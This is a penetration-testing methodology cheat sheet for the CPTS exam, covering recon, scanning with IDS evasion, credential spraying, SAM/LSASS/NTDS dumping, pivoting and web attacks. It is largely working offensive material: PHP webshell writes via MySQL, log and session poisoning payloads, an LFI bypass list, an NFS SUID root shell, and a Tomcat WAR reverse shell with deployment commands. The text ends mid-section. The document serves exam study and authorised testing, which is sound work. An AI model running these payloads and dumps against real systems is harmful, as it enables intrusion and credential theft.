# CPTS BULLETPROOF METHODOLOGY
## Decision-Tree Based, Iterative, Comprehensive

> This methodology covers 100% of the CPTS exam. Every attack, every scenario, every decision point.
> Follow the phases sequentially. After EACH new foothold, RESTART from Phase 1 on the new host.

---

# PHASE 0: SETUP & RECON PREP

## 0.1 - Tool Checklist (verify all present)
```
which nmap netexec nxc smbclient smbmap rpcclient enum4linux enum4linux-ng \
# Note: crackmapexec (CME) deprecated 2023 → use netexec (nxc). All commands below use netexec.
responder kerbrute bloodhound-python sharphound powerview rubeus mimikatz \
psexec.py wmiexec.py secretsdump.py smbexec.py mssqlclient.py GetNPUsers.py \
ticketer.py ntlmrelayx.py evil-winrm xfreerdp sshuttle chisel socat \
proxychains proxychains4 ssh plink hashcat john ffuf gobuster nikto sqlmap \
msfvenom msfconsole nc ncat python3
```

## 0.2 - 6-Layer Enumeration Methodology
```
1. Internet Presence — domains, subdomains, vHosts, ASN, netblocks, IPs, cloud instances
2. Gateway — firewalls, DMZ, IPS/IDS, EDR, proxies, NAC, VPN, Cloudflare
3. Accessible Services — service type, functionality, config, port, version, interface
4. Processes — PID, processed data, tasks, source, destination
5. Privileges — groups, users, permissions, restrictions, environment
6. OS Setup — OS type, patch level, network config, config files, sensitive files
```

## 0.3 - Injection Type Quick Reference
```
SQL Injection:       ' , ; -- /* */
Command Injection:   ; && | || ` ` $()
LDAP Injection:      * ( ) & |
XPath Injection:     ' or and not substring concat count
Code Injection:      ' ; -- /* */ $() ${} #{} %{} ^
Directory Traversal: ../ ..\ %00
Object Injection:    ; & |
XQuery Injection:    ' ; -- /* */
Shellcode Injection: \x \u %u %n
Header Injection:    \n \r\n \t %0d %0a %09
```

## 0.4 - Web Proxy Setup (Burp Suite / ZAP)
```
1. Start Burp: burpsuite (or ZAP: zaproxy)
2. Configure Firefox proxy: 127.0.0.1:8080
   └── Or use FoxyProxy extension (pre-configured in Kali/Parrot)
3. Install CA certificate:
   ├── Burp: browse to http://burp → download CA cert
   └── ZAP: Tools > Options > Network > Server Certificates → Save
4. Install in Firefox: about:preferences#privacy → View Certificates → Authorities → Import
5. Check "Trust this CA to identify websites"
```

**Burp Suite Key Features:**
```
├── Proxy > Intercept → Toggle on/off (keep OFF for passive)
├── Proxy > HTTP History → Review all requests
├── Target > Site Map → Application map
├── Repeater (Ctrl+R) → Modify and resend requests
├── Intruder (Ctrl+I) → Automated fuzzing/brute force
├── Decoder → Encode/decode (URL, Base64, HTML, Hex)
├── Comparer → Diff two responses
└── Right-click → Change request method (GET↔POST)
```

## 0.5 - Workspace Setup
```bash
mkdir -p loot screenshots notes
# Record EVERYTHING: timestamps, commands, output
# Every credential found → save immediately
# Every host compromised → note IP, hostname, user, method
```

## 0.6 - Vulnerability Scanning (Nessus / OpenVAS)
```bash
# Nessus (CPTS-relevant)
# 1. Install: sudo dpkg -i Nessus-*.deb; sudo systemctl start nessusd
# 2. Access: https://localhost:8834
# 3. Create scan → Basic Network Scan → Advanced → enable all plugins
# 4. Credentialed scan (SSH keys or password) → deeper findings
# 5. Export: .nessus, PDF, HTML

# Credentialed scan setup (SSH):
# Credentials → SSH → private key or password
# Credentialed scan setup (Windows):
# Credentials → Windows → LM/NTLM or password

# OpenVAS (free alternative)
sudo gvm-setup; sudo gvm-start
# Access: https://localhost:9392
# Scan → Tasks → New Task → Full and Fast

# Triage scanner output:
# High/Critical RCE → validate manually in Repeater
# Medium → check exploit-db for PoC
# Informational → focus on manual testing
```

## 0.7 - Audit Log Credential Harvesting (Linux)
```bash
# If member of adm group → can read TTY audit logs
# Logs contain cleartext passwords typed into su/sudo
aureport --tty                      # List TTY sessions
aureport --tty -i                   # Interactive sessions
# Search for password entries in audit logs
grep -a "password" /var/log/audit/audit.log.* 2>/dev/null
```

---

# QUICK REFERENCE CARDS

> Most-used during exam — flip here before diving into phases.

## CARD 1: FIRST 5 MINUTES (new target)
```bash
# Full TCP port scan
nmap -sT -p- --min-rate=10000 -oA full_tcp <target>

# Service scan on found ports
nmap -sC -sV -p <ports> -oA services <target>

# UDP top ports (always check)
sudo nmap -sU --top-ports=50 -oA udp_top <target>

# Web dir scan (if web found)
gobuster dir -u http://<target> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 50

# SMB enum (if 445 open)
smbclient -N -L //<target>
smbmap -H <target>
netexec smb <target> --shares -u '' -p ''
```

## CARD 2: GOT CREDS → SPRAY EVERYWHERE
```bash
netexec smb <range> -u <user> -p '<pass>'
netexec winrm <range> -u <user> -p '<pass>'
netexec mssql <range> -u <user> -p '<pass>'
netexec ssh <range> -u <user> -p '<pass>'
netexec rdp <range> -u <user> -p '<pass>'
netexec ldap <dc> -u <user> -p '<pass>'

# Interactive
evil-winrm -i <target> -u <user> -p '<pass>'
ssh <user>@<target>
xfreerdp /v:<target> /u:<user> /p:'<pass>'

# AD with creds → always run BloodHound
bloodhound-python -u <user> -p '<pass>' -ns <dc_ip> -d <domain> -c All

# AD with creds → always check
GetUserSPNs.py -dc-ip <dc> <domain>/<user> -request    # Kerberoast
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc>  # AS-REP
netexec ldap <dc> -u <user> -p '<pass>' -M laps        # LAPS
python3 gMSADumper.py -u <user> -p '<pass>' -d <domain>  # gMSA
certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc> -vulnerable -stdout  # ADCS
```

## CARD 3: GOT ADMIN → DUMP EVERYTHING
```bash
# Windows local — registry hives
reg.exe save hklm\sam C:\Windows\Temp\sam.save
reg.exe save hklm\system C:\Windows\Temp\system.save
reg.exe save hklm\security C:\Windows\Temp\security.save

# Windows remote (local admin)
netexec smb <target> -u <admin> -p '<pass>' --local-auth --sam --lsa

# LSASS dump
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full

# Linux
cat /etc/shadow /etc/passwd
find / -name 'id_rsa' 2>/dev/null
grep -rn password /etc /home /var/www 2>/dev/null

# Domain (if DA)
secretsdump.py -just-dc <domain>/<admin>:'<pass>'@<dc_ip>
```

## CARD 4: PIVOT (Ligolo-ng default)
```bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Pivot host
./agent -connect <attacker>:11601 -ignore-cert &

# Proxy console
session → select → start
# Attacker
sudo ip route add <internal_subnet> dev ligolo
nmap -sT -Pn <internal_host>
```

---

# PHASE 1: EXTERNAL RECON & ENUMERATION

## 1.1 - Passive Information Gathering
```
Decision: Do we have a domain name? → YES → proceed
                                      → NO → look for ASN, IP ranges, email addresses

Tools: viewdns.info, whois, shodan, censys, hunter.io, theHarvester, linkedin2username
```

**OSINT Sources:**
```bash
# Certificate transparency (subdomains from certs)
curl -s "https://crt.sh/?q=<domain>&output=json" | jq -r '.[].name_value' | sort -u

# Cloud resources (S3 buckets, Azure blobs)
# Google: site:s3.amazonaws.com "<company>"
# Google: intext:<company> inurl:blob.core.windows.net
# grayhatwarfare.com/publicbuckets

# Staff / LinkedIn → username generation
# Job posts reveal tech stack: Django, Flask, PostgreSQL, AWS
# linkedin2username.py -c "Company Name" -d domain.com

# GitHub secrets
# Search: "<company>" password, token, api_key
```

**DNS Enumeration:**
```bash
# Zone transfer attempt
dig axfr @<DNS_IP> <domain>

# Subdomain brute force
dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# DNS records
dig ANY <domain> @<DNS_IP>
dig A <domain>
dig MX <domain>
dig TXT <domain>
dig NS <domain>

# DNS version (reveals BIND/etc version)
dig CH TXT version.bind @<DNS_IP>

# Reverse DNS
dig -x <ip>

# Manual subdomain brute (fallback)
for sub in $(cat wordlist.txt); do dig +short $sub.<domain> @<DNS_IP> | grep -v '^$' && echo "$sub.<domain>"; done
```

## 1.2 - Active Scanning

**Port Scan Decision Tree:**
```
Target size?
├── Single host → Full TCP scan immediately
│   └── nmap -sT -p- --min-rate=10000 -oA full_tcp <target>
├── Small range (≤256) → Ping sweep then full scan
│   └── nmap -sn <range> -oA live_hosts
│   └── nmap -sT -p- -iL live_hosts.txt -oA full_tcp
└── Large range → Top 1000 first, then targeted deep scans
    └── nmap -sC -sV --top-ports=1000 -iL targets.txt -oA top1000
```

**Service Version Scan (after port discovery):**
```bash
nmap -sC -sV -p <discovered_ports> -oA detailed <target>
```

**Web Discovery:**
```bash
# Common web ports
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

# Screenshot with EyeWitness
eyewitness --web -x web_discovery.xml -d eyewitness_report

# Screenshot with Aquatone
cat web_discovery.xml | aquatone -nmap
```

## 1.2b - Firewall/IDS Evasion Techniques
```bash
# Source port bypass (DNS is often trusted)
nmap --source-port 53 -sS -Pn <target>
ncat -nv --source-port 53 <target> <port>

# Decoy scan (hide among random IPs)
nmap -D RND:5 -sS -Pn <target>
nmap -D decoy1,decoy2,ME,decoy3 -sS -Pn <target>

# Idle scan (ultra-stealthy, uses zombie host)
nmap -sI <zombie_host>:<zombie_port> -Pn <target>

# Source IP spoofing (requires access to network)
nmap -S <spoofed_ip> -e tun0 -sS -Pn <target>

# Fragment packets
nmap -f -Pn <target>
nmap --mtu 24 -Pn <target>

# FTP bounce scan (scan internal hosts via FTP)
nmap -Pn -v -n -p80 -b anonymous:pass@<ftp_server> <internal_target>

# SCTP scan (for SCTP services)
nmap -sY -Pn <target>    # INIT scan
nmap -sZ -Pn <target>    # COOKIE-ECHO scan

# IP protocol scan
nmap -sO -Pn <target>

# Window scan and Maimon scan
nmap -sW -Pn <target>    # Window scan
nmap -sM -Pn <target>    # Maimon scan

# IDS/IPS detection
# 1. Scan from external VPS
# 2. If connection drops after some ports = IPS present
# 3. Trigger alert with obvious scan, check if blocked
# 4. Use slow scan: -T0 or -T1 to evade rate-based detection

# Key flags
-Pn                    # Skip host discovery (treat as alive)
-n                     # No DNS resolution
--disable-arp-ping     # Skip ARP on local network
--packet-trace         # Show all packets sent/received
--reason               # Show why port classified as open/closed/filtered
-v / -vv               # Verbose (show ports as discovered)
-A                     # Aggressive: -sV -O --traceroute -sC
-F                     # Fast scan (top 100 ports)
-O                     # OS detection
--traceroute           # Traceroute to target

# Performance tuning
-T4                    # Aggressive timing (fast scans)
--initial-rtt-timeout 50ms --max-rtt-timeout 100ms
--max-retries 0        # No retries (faster, may miss ports)
--min-rate 300         # Minimum packets/sec
--stats-every=5s       # Progress monitoring

# NSE script categories
# auth, broadcast, brute, default (-sC), discovery, dos,
# exploit, external, fuzzer, intrusive, malware, safe, version, vuln

# Saving results
-oN target.nmap        # Normal
-oG target.gnmap       # Grepable
-oX target.xml         # XML
-oA target             # All formats
xsltproc target.xml -o target.html  # HTML report
```

## 1.3 - Service-Specific Enumeration

### SMB (139/445)
```bash
# Null session check
smbclient -N -L //<target>
smbmap -H <target>
smbmap -H <target> -r <share>

# RPC enumeration (deep)
rpcclient -U'%' <target>
rpcclient $> srvinfo                    # Server info
rpcclient $> enumdomains                # List domains
rpcclient $> querydominfo               # Domain info
rpcclient $> enumdomusers               # All users
rpcclient $> enumdomgroups              # All groups
rpcclient $> queryuser 0x457            # User by RID
rpcclient $> querygroup 0x200           # Group by RID
rpcclient $> querygroupmem 0x200        # Group members
rpcclient $> netshareenumall            # All shares
rpcclient $> netsharegetinfo <share>    # Share details
rpcclient $> getdompwinfo               # Password policy
rpcclient $> getusrdompwinfo <user>     # User password policy

# RID brute-forcing (enumerate all users via RPC)
for i in $(seq 500 1100); do rpcclient -U "%" -N <target> -c "queryuser 0x$(printf '%x' $i)" 2>/dev/null | grep "User Name"; done

# Comprehensive automated
enum4linux-ng.py <target> -A -C
# Outputs: password policy, lockout threshold, min length, complexity

# Impacket samrdump
samrdump.py <target>

# NetExec
netexec smb <target> --shares
netexec smb <target> --users
netexec smb <target> --pass-pol
netexec smb <target> -u '' -p '' --rid-brute

# Mount share (Linux)
sudo mount -t cifs -o username=user,password=pass,domain=. //<target>/<share> /mnt/share

# Windows interaction
dir \\<target>\<share>               # List share
net use n: \\<target>\<share>        # Map drive
net use n: \\<target>\<share> /user:domain\user pass
findstr /s /i cred n:\*.*           # Search for creds
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List  # PowerShell

# Search mounted shares for creds
find /mnt/share -name "*cred*" -o -name "*password*" -o -name "*secret*" 2>/dev/null
grep -rn "password" /mnt/share/ 2>/dev/null
```

### FTP (21)
```bash
# Anonymous login check
ftp <target>
# user: anonymous / pass: (empty)

# Version & scripts
nmap -sC -sV -p 21 <target>

# FTP interaction commands
ftp> debug              # Enable debug
ftp> trace              # Enable packet trace
ftp> status             # Connection status
ftp> ls -R              # Recursive listing
ftp> binary             # Binary transfer mode
ftp> put shell.php      # Upload file (if write access)
ftp> get file.txt       # Download file
ftp> wget -m ftp://anonymous:pass@<target>  # Bulk download

# SSL/TLS inspection
openssl s_client -connect <target>:21 -starttls ftp

# FTP bounce scan (scan internal hosts via FTP)
nmap -Pn -v -n -p80 -b anonymous:pass@<ftp_server> <internal_target>

# Brute force
hydra -L users.txt -P passwords.txt ftp://<target>
medusa -h <target> -U users.txt -P passwords.txt -M ftp
```

### SSH (22)
```bash
# Version
nmap -sV -p 22 <target>

# Brute force
hydra -L users.txt -P passwords.txt ssh://<target>
```

### SMTP (25)
```bash
# User enumeration
telnet <target> 25
VRFY admin
VRFY root
EXPN admin
RCPT TO: admin

# Nmap scripts
nmap --script smtp-enum-users -p 25 <target>
nmap --script smtp-open-relay -p 25 <target>

# Open relay testing
swaks --to target@domain.com --from attacker@domain.com --header "Subject: Test" --body "Test" --server <target>

# Manual SMTP interaction
telnet <target> 25
EHLO test
MAIL FROM:<attacker@domain.com>
RCPT TO:<victim@domain.com>
DATA
Subject: Test
Test body
.
QUIT
```

### POP3/IMAP (110/143/993/995)
```bash
# POP3 (plaintext)
nc <target> 110
USER <username>
PASS <password>
LIST
RETR <message_number>

# POP3 (TLS)
openssl s_client -connect <target>:995
USER <username>
PASS <password>
LIST
RETR <message_number>

# IMAP (TLS)
openssl s_client -connect <target>:993
1 LOGIN username password
1 LIST "" *
1 SELECT INBOX
1 FETCH <ID> all
1 FETCH <ID> body[]

# IMAP (plaintext)
nc <target> 143
1 LOGIN username password
1 LIST "" *
1 SELECT INBOX

# GUI: Evolution (Linux), Thunderbird
sudo apt-get install evolution
```

### DNS (53)
```bash
# Zone transfer
dig AXFR @<dns_server> <domain>

# Record enumeration
dig ANY <domain> @<dns_server>
nmap --script dns-brute --script-args dns-brute.threads=10 -p 53 <target>
```

### NFS (2049)
```bash
showmount -e <target>
sudo mount -t nfs <target>:<share> /mnt/nfs -o nolock
ls -la /mnt/nfs
ls -n /mnt/nfs   # Show UIDs (not resolved names)

# UID/GID spoofing (access files as file owner)
# 1. Note UID from ls -n
# 2. Create local user with matching UID
sudo useradd -u <target_uid> nfsuser
# 3. Access files as that user
su nfsuser

# no_root_squash exploitation (if present)
# Create SUID binary on share
gcc -o /mnt/nfs/rootshell /tmp/suid.c
chmod u+s /mnt/nfs/rootshell
# Execute on target → root shell

# Look for sensitive files, SSH keys, credentials
```

### LDAP (389)
```bash
# Anonymous bind
ldapsearch -h <target> -x -b "dc=domain,dc=com"
ldapsearch -h <target> -x -b "dc=domain,dc=com" "(objectClass=user)"
ldapsearch -h <target> -x -b "dc=domain,dc=com" "(objectClass=group)"
```

### MSSQL (1433)
```bash
# Connection
sqsh -S <target> -U <user> -P '<pass>'
mssqlclient.py <user>@<target>
sqlcmd -S <target> -U <user> -P '<pass>'

# Windows auth
sqsh -S <target> -U .\\<user> -P '<pass>'

# GUI: dbeaver (cross-platform), SSMS (Windows)
sudo dpkg -i dbeaver-<version>.deb && dbeaver &

# Hash capture (NTLMv2 to Responder)
SQL> xp_dirtree '\\<attacker>\share'
SQL> EXEC master..xp_subdirs '\\<attacker>\share'
```

### MySQL (3306)
```bash
mysql -u <user> -p<pass> -h <target>

# NSE scripts (automated enum)
nmap --script mysql-info -p 3306 <target>
nmap --script mysql-enum -p 3306 <target>
nmap --script mysql-empty-password -p 3306 <target>
nmap --script mysql-brute --script-args userdb=users.txt,passdb=pass.txt -p 3306 <target>

# Useful MySQL queries
SHOW DATABASES;
USE <database>;
SHOW TABLES;
SELECT * FROM <table>;
SELECT LOAD_FILE('/etc/passwd');  # Read files (if FILE privilege)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';  # Write files
```

### RDP (3389)
```bash
# Check NLA
nmap -sV -p 3389 <target>

# Brute force
hydra -L users.txt -P passwords.txt rdp://<target>
crowbar -b rdp -s <target>/32 -U users.txt -c 'Password123'
```

### WinRM (5985/5986)
```bash
netexec winrm <target> -u users.txt -p passwords.txt
evil-winrm -i <target> -u <user> -p '<pass>'
```

### VNC (5900)
```bash
hydra -P passwords.txt vnc://<target>
```

### SNMP (161)
```bash
snmpwalk -v2c -c public <target>
snmpwalk -v2c -c community <target>
onesixtyone -c community_strings.txt <target>

# OID-specific queries
# Processes: snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2
# Users: snmpwalk -v2c -c public TARGET 1.3.6.1.4.1.77.1.2.25
# TCP ports: snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.6.13.1.3
# Software: snmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.6.3.1.2

# braa (fast OID brute-force)
braa public@<target>:.1.3.6.*
braa community@<target>:.1.3.6.1.2.1.25.4.2.1.2  # Processes

# Nmap SNMP scripts
nmap --script snmp-brute -p 161 <target>
nmap --script snmp-info -p 161 -sU <target>
nmap --script snmp-interfaces -p 161 -sU <target>
nmap --script snmp-processes -p 161 -sU <target>
```

### Oracle TNS (1521)
```bash
nmap -p1521 -sV <target> --open
nmap -p1521 -sV <target> --open --script oracle-sid-brute
./odat.py all -s <target>
# Default creds: SYS:CHANGE_ON_INSTALL, DBSNMP:dbsnmp, SCOTT:tiger
sqlplus scott/tiger@<target>/XE
sqlplus scott/tiger@<target>/XE as sysdba
```

### IPMI (623/UDP)
```bash
sudo nmap -sU --script ipmi-version -p 623 <target>
# Default creds: root:calvin (Dell iDRAC), ADMIN:ADMIN (Supermicro)
# Hash dump via Metasploit: use auxiliary/scanner/ipmi/ipmi_dumphashes
# Crack: hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

### Rsync (873)
```bash
nc -nv <target> 873
#list
rsync -av --list-only rsync://<target>/<share>
rsync -av rsync://<target>/<share> ./loot/
```

### R-Services (512-514)
```bash
rlogin <target> -l <user>
rwho
rusers -al <target>
# Check /etc/hosts.equiv and ~/.rhosts for trust relationships
```

---

# PHASE 2: WEB APPLICATION ENUMERATION

> Passive first, active second. DNS/subdomain enum BEFORE directory brute-forcing.
> Always check WAF before aggressive scanning.

---

## 2.1 - PASSIVE RECON

### 2.1.1 - WHOIS
```bash
# Basic WHOIS
whois <domain>

# Key fields to note:
# - Registrar, creation/expiry dates
# - Name servers (NS records)
# - Registrant contact (email, org)
# - Historical WHOIS: whoisfreaks.com

# Automated
theHarvester -d <domain> -b all
```

### 2.1.2 - DNS Enumeration
```bash
# Zone transfer (high value - dumps entire zone)
dig axfr @<dns_server> <domain>

# Record types
dig A <domain> @<dns_server>
dig AAAA <domain> @<dns_server>
dig MX <domain> @<dns_server>
dig NS <domain> @<dns_server>
dig TXT <domain> @<dns_server>    # SPF, DKIM, verification strings
dig SOA <domain> @<dns_server>
dig SRV <domain> @<dns_server>    # Service discovery
dig ANY <domain> @<dns_server>
dig +trace <domain>               # Full resolution path

# Reverse DNS
dig -x <ip>

# Automated DNS enum
dnsenum --enum <domain> -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r
dnsrecon -d <domain> -t std
fierce --domain <domain>
```

### 2.1.3 - Subdomain Enumeration
```bash
# Passive (no direct connection to target)
# CT logs (crt.sh)
curl -s "https://crt.sh/?q=<domain>&output=json" | jq -r '.[].name_value' | sort -u

# Censys
censys search '<domain>' --index-type certificates

# Assetfinder
assetfinder --subs-only <domain>

# Amass (passive mode)
amass enum -passive -d <domain>

# Active (brute-force)
puredns resolve /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain <domain>
amass enum -active -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Filter live hosts
cat subdomains.txt | httpx -silent -status-code -title
```

### 2.1.4 - Google Dorking
```
site:<domain>                    # All indexed pages
site:<domain> filetype:pdf       # PDF documents
site:<domain> filetype:sql       # Database dumps
site:<domain> inurl:admin        # Admin panels
site:<domain> inurl:login        # Login pages
site:<domain> intext:"password"  # Pages mentioning password
cache:<domain>                   # Cached version
```

### 2.1.5 - Web Archives (Wayback Machine)
```bash
# Historical URLs
curl -s "http://web.archive.org/cdx/search/cdx?url=<domain>/*&output=text&fl=original&collapse=urlkey" | sort -u

# Wayback Machine: web.archive.org/web/*/domain.com
# Look for: old API endpoints, removed pages, hardcoded creds, dev URLs
```

### 2.1.6 - Application Discovery & Screenshotting
```bash
# Web discovery scan
nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list

# EyeWitness (screenshot all web apps)
eyewitness --web -x web_discovery.xml -d screenshots/

# Aquatone (screenshot + report)
cat web_discovery.xml | aquatone -out aquatone_report

# Review screenshots to identify:
├── CMS (WordPress, Drupal, Joomla)
├── Dev/staging environments (dev.*, staging.*)
├── Admin panels
├── Default pages (Apache, IIS, Tomcat)
└── Interesting applications (Jenkins, GitLab, Splunk, etc.)
```

---

## 2.2 - ACTIVE FINGERPRINTING & SCANNING

### 2.2.1 - WAF Detection (do FIRST)
```bash
# Detect WAF before aggressive scanning
wafw00f <target>

# If WAF present → reduce threads, use encoding, consider evasion
# If no WAF → proceed with normal scanning
```

### 2.2.2 - Technology Fingerprinting
```bash
# Server headers
curl -I http://<target>

# Technology detection
whatweb http://<target>
wappalyzer <target>              # Browser extension or CLI

# Nikto (software identification only)
nikto -h <target> -Tuning b

# Common files
curl -s http://<target>/robots.txt        # Hidden paths
curl -s http://<target>/sitemap.xml       # Site structure
curl -s http://<target>/.git/HEAD         # Git leak
curl -s http://<target>/.well-known/openid-configuration  # OAuth/OIDC
curl -s http://<target>/security.txt      # Security contacts
```

### 2.2.3 - Virtual Host Discovery
```bash
# Add discovered vhosts to /etc/hosts
echo "10.129.x.x app.domain.local dev.domain.local" | sudo tee -a /etc/hosts

# ffuf vhost fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://domain.local/ -H 'Host: FUZZ.domain.local' -fs <default_size>

# gobuster vhost (append-domain mode)
gobuster vhost -u http://<target> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain

# feroxbuster vhost
feroxbuster -u http://<target> -w wordlist --virtual-hosts
```

### 2.2.4 - Directory Brute-Forcing
```bash
gobuster dir -u http://<target> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50
ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
feroxbuster -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

### 2.2.4b - GraphQL Endpoint Discovery + Introspection

```bash
# Common GraphQL paths to probe
for p in /graphql /graphiql /api/graphql /v1/graphql /query /api /api/v1/graphql; do
  curl -s -X POST "http://<target>$p" -H "Content-Type: application/json" -d '{"query":"{__typename}"}' | head -c 200
  echo " ← $p"
done

# Introspection query (if enabled — instant schema dump)
curl -X POST http://<target>/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name} mutationType{name} types{name fields{name args{name type{name}}}}}}"}' | jq

# Fingerprint (graphw00f) — works even when introspection disabled
python3 graphw00f.py -t http://<target>/graphql -d -f

# Brute-force schema when introspection disabled
python3 clairvoyance.py -o schema.json -w wordlist.txt http://<target>/graphql

# Common abuse
# - Query for sensitive fields the UI doesn't expose: users { password, apiKey, ssn }
# - Mutations: mutation { updateUser(id:1, role:"admin"){id} }
# - Batching (DoS / auth bypass): [{"query":"..."},{"query":"..."},...]
# - Field suggestions enabled even with introspection off → leak field names via typos
```

### 2.2.5 - Web Crawling
```bash
# Burp Suite Spider (proxy → spider target)
# OWASP ZAP Spider (automated crawl)
# ReconSpider (custom Python crawler)
python3 ReconSpider.py -u http://<target>

# Extract from crawled data: emails, JS files, comments, form fields, API endpoints
```

---

## 2.3 - CMS Detection & Enumeration

```
Decision: What CMS/application?
├── WordPress → WPScan, plugin/theme enum, user enum
├── Joomla → joomscan, droopescan
├── Drupal → droopescan, Drupalgeddon checks
├── Tomcat → /manager, /host-manager, default creds
├── Jenkins → /script, /manage, default creds
├── GitLab → Public repos, user registration, API
├── Splunk → License status, default creds
├── PRTG → Default creds (prtgadmin:prtg)
├── osTicket → Version check, known vulns
├── phpMyAdmin → Default creds, SQL operations
└── Unknown → Manual testing, Wappalyzer
```

### WordPress
```bash
# Manual enumeration
curl -s http://target | grep WordPress
curl -s http://target | grep themes
curl -s http://target | grep plugins
curl -s http://target/wp-content/plugins/mail-masta/readme.txt

# User enumeration via login page error messages
# Valid user + wrong pass: "The password for username admin is incorrect"
# Invalid user: "The username someone is not registered"

# WPScan
wpscan --url http://target --enumerate --api-token <token>
wpscan --url http://target --enumerate ap  # All plugins
wpscan --url http://target --enumerate at  # All themes

# Brute force via XML-RPC (faster)
wpscan --url http://target --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt

# Theme editor RCE (needs admin)
# Appearance → Theme Editor → 404.php → Add: system($_GET[0]);
# Access: http://target/wp-content/themes/theme/404.php?0=id

# Metasploit WP admin shell
use exploit/unix/webapp/wp_admin_shell_upload
```

### Tomcat
```bash
# Check version
curl -s http://target:8080/docs/ | grep Tomcat

# Default credentials to try
# tomcat:tomcat, admin:admin, admin:(empty), tomcat:s3cret, admin:tomcat

# Directory enumeration
gobuster dir -u http://target:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

# WAR upload for RCE (after getting manager access)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f war -o shell.war
curl -u tomcat:tomcat --upload-file shell.war "http://target:8080/manager/text/deploy?path=/shell&update=true"
curl http://target:8080/shell/

# Metasploit
use exploit/multi/http/tomcat_mgr_upload
```

### Drupal
```bash
# Enumeration
droopescan scan drupal -u http://target

# Drupalgeddon2 (CVE-2018-7600) - Unauthenticated RCE
use exploit/unix/drupal/drupal_drupageddon2

# Drupalgeddon3 - Authenticated RCE
use exploit/multi/http/drupal_drupageddon3
# Requires valid session cookie
```

### Joomla
```bash
joomscan -u http://target
droopescan scan joomla -u http://target
# Check robots.txt for /administrator/
# Check directory listing in /components/, /modules/, /plugins/
```

---

# PHASE 3: WEB APPLICATION ATTACKS

## 3.1 - File Inclusion (LFI/RFI)
```
Decision: Is user input used in file paths?
├── Yes → Test for LFI
│   ├── Basic: ../../../etc/passwd
│   ├── Encoded: ..%252f..%252f..%252fetc/passwd
│   ├── PHP filter: php://filter/convert.base64-encode/resource=index.php
│   ├── PHP input: php://input (POST body as code)
│   ├── Log poisoning: /var/log/apache2/access.log
│   └── SSH log poisoning: /var/log/auth.log
├── RFI possible? → http://attacker/shell.txt
└── No → Move to next attack
```

**LFI Bypass Cheatsheet:**
```
../          ..%252f     ..%c0%af     ..%255c
....//       ..\/        ..;/         %00 (null byte)
..././       ....\/\/    ..;/         ....//
php://filter/convert.base64-encode/resource=
expect://id
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4=
```

**Read vs Execute Functions (Critical Distinction):**
```
PHP:
├── include()/include_once() → READ + EXECUTE + REMOTE URL
├── require()/require_once() → READ + EXECUTE (no remote)
├── file_get_contents() → READ only + REMOTE URL
└── fopen()/file() → READ only (no remote)

NodeJS:
├── fs.readFile() → READ only
├── fs.sendFile() → READ only
└── res.render() → READ + EXECUTE

Java:
├── include → READ only
└── import → READ + EXECUTE + REMOTE URL

.NET:
├── @Html.Partial() → READ only
├── Response.WriteFile() → READ only
└── include → READ + EXECUTE + REMOTE URL
```

**Second-Order LFI Attacks:**
```
Poison database entry with LFI payload (e.g., username = ../../../etc/passwd)
→ Another function uses that entry to load file
→ Example: /profile/$username/avatar.png → includes our malicious path
→ Test: Register with LFI payload as username, then access avatar/profile endpoints
```

**allow_url_include Check (Critical for RFI/data/input/expect):**
```bash
# Read PHP config via LFI
curl "http://target/page.php?file=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
# Decode and grep for allow_url_include
echo 'BASE64...' | base64 -d | grep allow_url_include
```

**PHP Session Poisoning:**
```bash
# Session file: /var/lib/php/sessions/sess_<PHPSESSID>
# Get PHPSESSID from cookie

# Step 1: Poison session (inject PHP code into session via parameter)
curl "http://target/page.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E"

# Step 2: Include session file
curl "http://target/page.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id"

# Note: Must re-poison after each inclusion (gets overwritten)
```

**Log Poisoning Steps:**
```bash
# Apache log poisoning
# 1. Inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
# 2. Include log file
curl "http://target/page.php?file=/var/log/apache2/access.log&cmd=id"

# SSH log poisoning (auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@target
# Then include /var/log/auth.log
curl "http://target/page.php?file=/var/log/auth.log&cmd=id"

# Nginx log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
curl "http://target/page.php?file=/var/log/nginx/access.log&cmd=id"

# /proc/self/environ poisoning
